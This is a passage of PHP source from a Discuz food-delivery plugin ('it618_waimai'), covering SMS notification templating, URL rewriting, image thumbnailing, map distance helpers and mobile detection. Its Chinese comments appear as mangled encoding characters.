			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
					$tmpvalue=str_replace("{sfmoney}",$it618_waimai_gwcsale_main['it618_sfmoney'],$tmpvalue);
					$tmpvalue=str_replace("{score}",$it618_waimai_gwcsale_main['it618_score'],$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}

			$ALDYBody=$Body;
			$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
			$Body=str_replace("{sfmoney}",$it618_waimai_gwcsale_main['it618_sfmoney'],$Body);
			$Body=str_replace("{score}",$it618_waimai_gwcsale_main['it618_score'],$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_tk_user_tplid;
				
				$tmparr=explode("{saleid}",$ALDYBody);
				if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
				
				$tmparr=explode("{sfmoney}",$ALDYBody);
				if(count($tmparr)>1)$param.='"sfmoney":"'.$it618_waimai_gwcsale_main['it618_sfmoney'].'",';
				
				$tmparr=explode("{score}",$ALDYBody);
				if(count($tmparr)>1)$param.='"score":"'.$it618_waimai_gwcsale_main['it618_score'].'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}
		}
		
		if($Body!=''||(count($param_wxsms)>0&&$uid!='')){
			require_once DISCUZ_ROOT.'./source/plugin/it618_waimai/message.func.php';
			
			if(count($param_wxsms)>0&&$uid!=''){
				$tmparr=explode(",",$uid);
				for($i=0;$i<count($tmparr);$i++){
					$wxsms=sendSMS_WX($tmparr[$i],$url_this.$tmpurl,$tplid_wxsms,$param_wxsms);
				}
			}
			
			if($Body!=''&&$tel!=''&&$wxsms!='true'){
				$Body=str_replace('$','',$Body);
	
				if($it618_type=='smsbao'){
					if($it618_smsbaosign!='')$it618_smsbaosign=$it618_waimai_lang['s1797'].$it618_smsbaosign.$it618_waimai_lang['s1798'];
					sendSMS($it618_tel,$it618_password,$tel,$it618_smsbaosign.$Body);
				}else{
					sendSMS_ALi($tel,$Body,$it618_sign,$tplid,$param,$it618_type);
				}
			}
		}
	}
}
if(!it618_waimai_verify())return;
function it618_waimai_multipage($pagevalue,$uri=''){
	global $_G,$_GET;
	if($_G['cache']['plugin']['it618_waimai']['rewriteurl']==0||!file_exists(DISCUZ_ROOT.'./source/plugin/it618_waimai/rewrite.php')){
		return $pagevalue;
	}

	require DISCUZ_ROOT.'./source/plugin/it618_waimai/rewrite.php';

	$tmparr=explode("it618page".$urltype."?page=",$pagevalue);
	$pagevalue='';

	$urltype=$urltype.$uri;
	for($i=0;$i<count($tmparr);$i++){
		
		$tmpstr=$tmparr[$i];
		$tmparr1=explode('" class=',$tmpstr);
		if(count($tmparr1)>1){
			$page=$tmparr1[0];
			$tmpstr=str_replace($page.'" class=',$page.$urltype.'" class=',$tmpstr);
		}
		
		$tmparr1=explode('">',$tmpstr);
		$tmparr2=explode('</a><',$tmparr1[1]);
		if(count($tmparr2)>1){
			$page=$tmparr2[0];
			$tmpstr=str_replace($page.'">'.$page.'</a>',$page.$urltype.'">'.$page.'</a>',$tmpstr);
			
		}
		
		$pagevalue.=$tmpstr;
	}
	
	$pagevalue=str_replace("+this.value","+this.value+'".$urltype."'",$pagevalue);
	
	return $pagevalue;
}


function it618_waimai_getrewrite($pagetype,$pagevalue,$url,$uri=''){
	global $_G,$_GET;
	
	if($_G['cache']['plugin']['it618_waimai']['rewriteurl']==0||!file_exists(DISCUZ_ROOT.'./source/plugin/it618_waimai/rewrite.php')){
		return $url;
	}

	require DISCUZ_ROOT.'./source/plugin/it618_waimai/rewrite.php';
	
	if($pagetype=='waimai_home'){
		return $waimai_home.$urltype;
	}
	
	if($pagetype=='waimai_list'){//waimai_list-{cid1}-{cid2}-{aid1}-{aid2}-{order}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$waimai_list.$waimai_list1;

		if(count($tmparr)==1){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("-{cid2}-{aid1}-{aid2}-{order}-{page}",'',$pageurl);
		}
		
		if(count($tmparr)==2){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("-{aid1}-{aid2}-{order}-{page}",'',$pageurl);
		}
		
		if(count($tmparr)==4){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("{aid1}",$tmparr[2],$pageurl);
			$pageurl=str_replace("{aid2}",$tmparr[3],$pageurl);
			$pageurl=str_replace("-{order}-{page}",'',$pageurl);
		}
		
		if(count($tmparr)==5){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("{aid1}",$tmparr[2],$pageurl);
			$pageurl=str_replace("{aid2}",$tmparr[3],$pageurl);
			$pageurl=str_replace("{order}",$tmparr[4],$pageurl);
			$pageurl=str_replace("{page}",'1',$pageurl);
		}
		
		if(count($tmparr)==6){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("{aid1}",$tmparr[2],$pageurl);
			$pageurl=str_replace("{aid2}",$tmparr[3],$pageurl);
			$pageurl=str_replace("{order}",$tmparr[4],$pageurl);
			$pageurl=str_replace("{page}",$tmparr[5],$pageurl);
		}
		
		return $pageurl.$uri;
	}
	
	if($pagetype=='waimai_search'){//waimai_search-{cid1}-{cid2}-{aid1}-{aid2}-{order}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$waimai_search.$waimai_search1;
		
		if($pagevalue==''){
			$pageurl=str_replace("-{cid1}-{cid2}-{aid1}-{aid2}-{order}-{page}","",$pageurl);
		}else{
			if(count($tmparr)==5){
				$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{aid1}",$tmparr[2],$pageurl);
				$pageurl=str_replace("{aid2}",$tmparr[3],$pageurl);
				$pageurl=str_replace("{order}",$tmparr[4],$pageurl);
				$pageurl=str_replace("{page}",'1',$pageurl);
			}
			
			if(count($tmparr)==6){
				$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{aid1}",$tmparr[2],$pageurl);
				$pageurl=str_replace("{aid2}",$tmparr[3],$pageurl);
				$pageurl=str_replace("{order}",$tmparr[4],$pageurl);
				$pageurl=str_replace("{page}",$tmparr[5],$pageurl);
			}
		}
		
		return $pageurl.$uri;
	}
	
	if($pagetype=='waimai_wap'){//waimai_wap-{pagetype}-{sid}-{oid}-{cid}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$waimai_wap.$waimai_wap1;
		
		if($pagevalue==''){
			$pageurl=str_replace("-{pagetype}-{sid}-{oid}-{cid}-{page}","",$pageurl);
		}else{
			$tmparr=explode("@",$pagevalue);
			if(count($tmparr)==2){
				$pageurl=str_replace("-{oid}-{cid}-{page}","",$pageurl);
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{sid}",$tmparr[1],$pageurl);
			}if(count($tmparr)==3){
				$pageurl=str_replace("-{cid}-{page}","",$pageurl);
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{sid}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{oid}",$tmparr[2],$pageurl);
			}else{
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{sid}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{oid}",$tmparr[2],$pageurl);
				$pageurl=str_replace("{cid}",$tmparr[3],$pageurl);
				$pageurl=str_replace("{page}",$tmparr[4],$pageurl);
			}
		}
		
		return $pageurl.$uri;
	}
	
	if($pagetype=='shop_home'){//shop-{sid}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$wshop_home.$wshop_home1;
		
		if(count($tmparr)>1){
			$pageurl=str_replace("{sid}",$tmparr[0],$pageurl);
			$pageurl=$pageurl.'?'.$tmparr[1];
		}else{
			$pageurl=str_replace("{sid}",$pagevalue,$pageurl);
		}
		
		return $pageurl.$uri;
	}

	if($pagetype=='shop_sc'){
		if($uri!=''){
			$urltype=$urltype.'?'.$uri;
		}
		return $wshop_sc.$urltype;
	}
}

function it618_waimai_rewriteurl($uid){
	global $_G;
	if($_G['cache']['plugin']['it618_waimai']['rewriteurl']==1){
		return 'space-uid-'.$uid.'.html';
	}else{
		return 'home.php?mod=space&uid='.$uid;
	}
}

function it618_waimai_getusername($uid){
	return C::t('#it618_waimai#it618_waimai_sale')->fetch_username_by_uid($uid);
}

function it618_waimai_utftogbk($strcontent,$type=1){
	if($type==1)$strcontent=dhtmlspecialchars($strcontent);
	
	$s1 = iconv('utf-8','gbk',$strcontent);
	$s0 = iconv('gbk','utf-8',$s1);
	if($s0 == $strcontent){
		$tmpstr = $s1;
	}else{
		$tmpstr = $strcontent;
	}
	
	if(CHARSET=='gbk'){
		return $tmpstr;
	}else{
		return it618_waimai_gbktoutf($strcontent);
	}
}

function it618_waimai_gbktoutf($strcontent){
	$s1 = iconv('utf-8','gbk',$strcontent);
	$s0 = iconv('gbk','utf-8',$s1);
	if($s0 == $strcontent){
		$tmpstr = $s1;
	}else{
		$tmpstr = $strcontent;
	}

	return iconv('gbk','utf-8', $tmpstr);
}

function it618_waimai_discuz_uc_avatar($uid, $size = '', $returnsrc = TRUE) {
	require_once DISCUZ_ROOT.'./config/config_ucenter.php';
	if($uid > 0) {
	   $size = in_array($size, array('big', 'middle', 'small')) ? $size : 'middle';
	   $uid = abs(intval($uid));
	   if(empty($GLOBALS['avatarmethod'])) {
		return $returnsrc ? UC_API.'/avatar.php?uid='.$uid.'&size='.$size : '<img src="'.UC_API.'/avatar.php?uid='.$uid.'&size='.$size.'" />';
	   } else {
		$uid = sprintf("%09d", $uid);
		$dir1 = substr($uid, 0, 3);
		$dir2 = substr($uid, 3, 2);
		$dir3 = substr($uid, 5, 2);
		$file = UC_API.'/data/avatar/'.$dir1.'/'.$dir2.'/'.$dir3.'/'.substr($uid, -2).'_avatar_'.$size.'.jpg';
		return $returnsrc ? $file : '<img src="'.$file.'" onerror="this.onerror=null;this.src=\''.UC_API.'/images/noavatar_'.$size.'.gif\'" />';
	   }
	} else {
	   $file = $GLOBALS['boardurl'].IMGDIR.'/syspm.gif';
	   return $returnsrc ? $file : '<img src="'.$file.'" />';
	}
}

function it618_waimai_gettime($it618_time){
	global $_G;
	$timecount=intval(($_G['timestamp']-$it618_time)/3600);
	if($timecount>24){
		$timecount=intval($timecount/24);
		$timestr=$timecount.it618_waimai_getlang('s529');
	}elseif($timecount>=1){
		$timestr=$timecount.it618_waimai_getlang('s530');
	}else{
		$timecount=intval(($_G['timestamp']-$it618_time)/60);
		if($timecount>=1){
			$timestr=$timecount.it618_waimai_getlang('s531');
		}else{
			$timecount=intval(($_G['timestamp']-$it618_time));
			if($timecount==0)$timecount=1;
			$timestr=$timecount.it618_waimai_getlang('s532');
		}
	}
	
	return $timestr;
}

function it618_waimai_getonlinestate($it618_uid){
	if(TIMESTAMP-C::t('#it618_waimai#it618_waimai_sale')->fetch_lastactivity_by_uid($it618_uid)<=900){
		$tmponlineico='<img src="source/plugin/it618_waimai/images/online.gif" align="absmiddle" title="'.it618_waimai_getlang('s533').'" />';
	}else{
		$tmponlineico='<img src="source/plugin/it618_waimai/images/offline.gif" align="absmiddle" title="'.it618_waimai_getlang('s534').'" />';
	}
	
	return $tmponlineico;
}

function it618_waimai_ubbtotext($Text) {
	$Text=preg_replace("/\[url=(.+?)\](.+?)\[\/.+?\]/is","",$Text);
	$Text=preg_replace("/\[coverimg\](.+?)\[\/coverimg\]/is","",$Text);
	$Text=preg_replace("/\[img\](.+?)\[\/img\]/is","",$Text);
	$Text=preg_replace("/\[img=(.+?)\](.+?)\[\/img\]/is","",$Text);
	$Text=preg_replace("/\[media=(.+?)\](.+?)\[\/media\]/is","",$Text);
	$Text=preg_replace("/\[attach\](.+?)\[\/attach\]/is","",$Text);
	$Text=preg_replace("/\[audio\](.+?)\[\/audio\]/is","",$Text);
	$Text=preg_replace("/\[hide\](.+?)\[\/hide\]/is","",$Text);
	$Text=preg_replace("/\[(.+?)\]/is","",$Text);
	$Text=preg_replace("/\{:(.+?):\}/is","",$Text);
	
	$Text=str_replace("<br />","",$Text);
	return $Text;
}

function it618_waimai_rewriteurl_thread($fl_html){
	global $_G;
	if($_G['cache']['plugin']['it618_waimai']['rewriteurl']==1){
		//	forum.php?mod=viewthread&tid=43
		//	thread-43-1-1.html
		$tmparr=explode("forum.php?mod=viewthread",$fl_html);
		if(count($tmparr)>1){
			$fl_html="";
			foreach($tmparr as $key => $tmp){
				if(strpos($tmp,"tid=")==1){
					$tmp=str_replace("&tid=","thread-",$tmp);
					$tmparr1=explode('"',$tmp,2);
					$fl_html.=$tmparr1[0].'-1-1.html"'.$tmparr1[1];
				}else{
					$fl_html.=$tmp;
				}
			}
		}

	}
	return $fl_html;
}

function it618_waimai_mapbdtotx($lat,$lng){
	$x_pi = 3.14159265358979324 * 3000.0 / 180.0;
	$x = $lng - 0.0065;
	$y = $lat - 0.006;
	$z = sqrt($x * $x + $y * $y) - 0.00002 * sin($y * $x_pi);
	$theta = atan2($y, $x) - 0.000003 * cos($x * $x_pi);
	$lng = $z * cos($theta);
	$lat = $z * sin($theta);
	return array('lng'=>$lng,'lat'=>$lat);
}

function it618_waimai_maptxtobd($lat,$lng){  
    $x_pi = 3.14159265358979324 * 3000.0 / 180.0;
	$x = $lng;
	$y = $lat;
	$z =sqrt($x * $x + $y * $y) + 0.00002 * sin($y * $x_pi);
	$theta = atan2($y, $x) + 0.000003 * cos($x * $x_pi);
	$lng = $z * cos($theta) + 0.0065;
	$lat = $z * sin($theta) + 0.006;
	return array('lng'=>$lng,'lat'=>$lat);
}

//��������֪��γ��֮��ľ���,��λΪm
function it618_waimai_getdistance($lng1,$lat1,$lng2,$lat2){
	//���Ƕ�תΪ����
	$radLat1=deg2rad($lat1);//deg2rad()�������Ƕ�ת��Ϊ����
	$radLat2=deg2rad($lat2);
	$radLng1=deg2rad($lng1);
	$radLng2=deg2rad($lng2);
	$a=$radLat1-$radLat2;
	$b=$radLng1-$radLng2;
	$s=2*asin(sqrt(pow(sin($a/2),2)+cos($radLat1)*cos($radLat2)*pow(sin($b/2),2)))*6378.137*1000;
	return $s;
}

function it618_waimai_getdistance_gd($lng1,$lat1,$lng2,$lat2){
	global $it618_waimai;
	
	$key=trim($it618_waimai['waimai_lbsmkey']);
	$url = "http://restapi.amap.com/v3/distance?origins=$lng1,$lat1&destination=$lng2,$lat2&output=json&key=$key";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$res = curl_exec($ch);

	curl_close( $ch );
	$data = json_decode($res, true);
	
	return $data;
}

function it618_waimai_delfile($dirName){
	it618_waimai_del_dir($dirName);
}

function it618_waimai_del_dir($dir,$type=0){
    if(is_dir($dir)){
        foreach(scandir($dir) as $row){
            if($row == '.' || $row == '..'){
                continue;
            }
            $path = $dir .'/'. $row;
            if(filetype($path) == 'dir'){
                it618_waimai_del_dir($path,$type);
            }else{
                unlink($path);
            }
        }
        if($type==1)rmdir($dir);
    }else{
        return false;
    }
}

function it618_waimai_dirsize($dir) { 
	@$dh = opendir($dir); 
	$size = 0; 
	while ($file = @readdir($dh)) { 
	if ($file != "." and $file != "..") { 
	$path = $dir."/".$file; 
	if (is_dir($path)) { 
	$size += it618_waimai_dirsize($path); 
	} elseif (is_file($path)) { 
	$size += filesize($path); 
	} 
	} 
	} 
	@closedir($dh); 
	return $size; 
}

function it618_waimai_getfileext($filestr){
	$file_ext=strtolower(substr($filestr,strrpos($filestr, '.')+1)); 
	$tmparr=explode("?",$file_ext);
	return $tmparr[0];
}

function it618_waimai_getgoodspic($shopid,$pid,$it618_picbig,$i=0){
	$file_ext=it618_waimai_getfileext($it618_picbig);
	
	return 'source/plugin/it618_waimai/kindeditor/data/shop'.$shopid.'/smallimage/goods'.$pid.'_'.$i.'.'.$file_ext.'?'.substr(md5($it618_picbig),0,6);
}

function it618_waimai_getwapppic($shopid,$get_it618_picbig,$type=1){
	$file_ext=it618_waimai_getfileext($get_it618_picbig);
	
	$tmpshopid=explode('wapad',$shopid);
	if(count($tmpshopid)>1){
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_waimai/kindeditor/data/smallimage/'.$shopid.'.'.$file_ext;
		
		if($type==1){
			if(!file_exists($it618_smallurl))$flag=1;
		}else{
			$flag=1;
		}
		if($flag==1) {
				
			$smallpath=DISCUZ_ROOT.'./source/plugin/it618_waimai/kindeditor/data/smallimage/';
			if(!file_exists($smallpath)) {
				mkdir($smallpath);
			}
		
			$tmparr1=explode("://",$get_it618_picbig);
			if(count($tmparr1)>1){
				$it618_url=$get_it618_picbig;
			}else{
				$tmparr=explode("source",$get_it618_picbig);
				$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
			}

			it618_waimai_imagetosmall($it618_url,$it618_smallurl,$file_ext,640,230,1);
		}
		
		$it618_smallurl='source/plugin/it618_waimai/kindeditor/data/smallimage/'.$shopid.'.'.$file_ext;
	}else{
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_waimai/kindeditor/data/shop'.$shopid.'/smallimage/shop'.$shopid.'.'.$file_ext;
		
		if($type==1){
			if(!file_exists($it618_smallurl))$flag=1;
		}else{
			$flag=1;
		}
		if($flag==1) {
			
			$smallpath=DISCUZ_ROOT.'./source/plugin/it618_waimai/kindeditor/data/shop'.$shopid.'/';
			if(!file_exists($smallpath)) {
				mkdir($smallpath);
			}
				
			$smallpath=DISCUZ_ROOT.'./source/plugin/it618_waimai/kindeditor/data/shop'.$shopid.'/smallimage/';
			if(!file_exists($smallpath)) {
				mkdir($smallpath);
			}
		
			$tmparr1=explode("://",$get_it618_picbig);
			if(count($tmparr1)>1){
				$it618_url=$get_it618_picbig;
			}else{
				$tmparr=explode("source",$get_it618_picbig);
				$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
			}
			
			it618_waimai_imagetosmall($it618_url,$it618_smallurl,$file_ext,320,210,1);
		}
		
		$it618_smallurl='source/plugin/it618_waimai/kindeditor/data/shop'.$shopid.'/smallimage/shop'.$shopid.'.'.$file_ext;
	}
	
	return $it618_smallurl.'?'.substr(md5($get_it618_picbig),0,6);
}

function it618_waimai_imagetosmall($bigimagepath,$smallimagepath,$file_ext,$width,$height=0,$type=0){
	//��ΪPHPֻ�ܶ���Դ���в���������Ҫ����Ҫ�������ŵ�ͼƬ���п���������Ϊ�µ���Դ 
	if($file_ext=='jpg'||$file_ext=='jpeg')$src=imagecreatefromjpeg($bigimagepath); 
	if($file_ext=='png')$src=imagecreatefrompng($bigimagepath); 
	if($file_ext=='gif')$src=imagecreatefromgif($bigimagepath); 
	
	//ȡ��ԴͼƬ�Ŀ��Ⱥ͸߶� 
	$size_src=getimagesize($bigimagepath); 
	$w=$size_src['0']; 
	$h=$size_src['1']; 
	
	//$maxָ�����ų��������Ŀ��ȣ�Ҳ�п����Ǹ߶ȣ�
	
	if($type==0){
		$max=$width;
		//�������ֵΪ300�������һ���ߵĳ��ȣ��õ����ź��ͼƬ���Ⱥ͸߶� 
		if($w > $h){ 
		   $w=$max;
		   $h=$h*($max/$size_src['0']); 
		}else{ 
		   $h=$max;
		   $w=$w*($max/$size_src['1']); 
		} 
	}else{
		$w=$width;
		$h=$height;
	}
	
	//����һ��$w����$h�ߵ����ͼƬ��Դ 
	$image=imagecreatetruecolor($w, $h); 
	 
	//�ؼ�������������Ŀ����Դ��Դ��Ŀ����Դ�Ŀ�ʼ����x,y, Դ��Դ�Ŀ�ʼ����x,y,Ŀ����Դ�Ŀ���w,h,Դ��Դ�Ŀ���w,h�� 
	imagecopyresampled($image, $src, 0, 0, 0, 0, $w, $h, $size_src['0'], $size_src['1']); 
	
	if($file_ext=='jpg'||$file_ext=='jpeg')imagejpeg($image,$smallimagepath); 
	if($file_ext=='png')imagepng($image,$smallimagepath); 
	if($file_ext=='gif')imagegif($image,$smallimagepath); 
	
	//������Դ 
	imagedestroy($image); 
}

function waimai_qrcode($url){
	include DISCUZ_ROOT.'./source/plugin/it618_waimai/phpqrcode.php';
	
	$qrcodeurl=md5($url);
	$qrcodeurl='source/plugin/it618_waimai/qrcode/'.$qrcodeurl.'.png';
	if(!file_exists($qrcodeurl)){
		$errorCorrectionLevel = 'L';//�ݴ����� 
		$matrixPointSize = 6;//����ͼƬ��С 
		//���ɶ�ά��ͼƬ 
		QRcode::png($url, $qrcodeurl, $errorCorrectionLevel, $matrixPointSize, 2); 
	}

	return $qrcodeurl;	
}

function waimai_is_mobile(){ 
	global $_GET;
	
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$mobile_agents = Array("240x320","acer","acoon","acs-","abacho","ahong","airness","alcatel","amoi","android","anywhereyougo.com","applewebkit/525","applewebkit/532","asus","audio","au-mic","avantogo","becker","benq","bilbo","bird","blackberry","blazer","bleu","cdm-","compal","coolpad","danger","dbtel","dopod","elaine","eric","etouch","fly ","fly_","fly-","go.web","goodaccess","gradiente","grundig","haier","hedy","hitachi","htc","huawei","hutchison","inno","ipad","ipaq","ipod","jbrowser","kddi","kgt","kwc","lenovo","lg ","lg2","lg3","lg4","lg5","lg7","lg8","lg9","lg-","lge-","lge9","longcos","maemo","mercator","meridian","micromax","midp","mini","mitsu","mmm","mmp","mobi","mot-","moto","nec-","netfront","newgen","nexian","nf-browser","nintendo","nitro","nokia","nook","novarra","obigo","palm","panasonic","pantech","philips","phone","pg-","playstation","pocket","pt-","qc-","qtek","rover","sagem","sama","samu","sanyo","samsung","sch-","scooter","sec-","sendo","sgh-","sharp","siemens","sie-","softbank","sony","spice","sprint","spv","symbian","tablet","talkabout","tcl-","teleca","telit","tianyu","tim-","toshiba","tsm","up.browser","utec","utstar","verykool","virgin","vk-","voda","voxtel","vx","wap","wellco","wig browser","wii","windows ce","wireless","xda","xde","zte"); 
	$is_mobile = false; 
	foreach ($mobile_agents as $device) { 
	if (stristr($user_agent, $device)) { 
	$is_mobile = true; 
	break; 
	} 
	} 
	return $is_mobile; 
}
//From: Dism_taobao-com
?>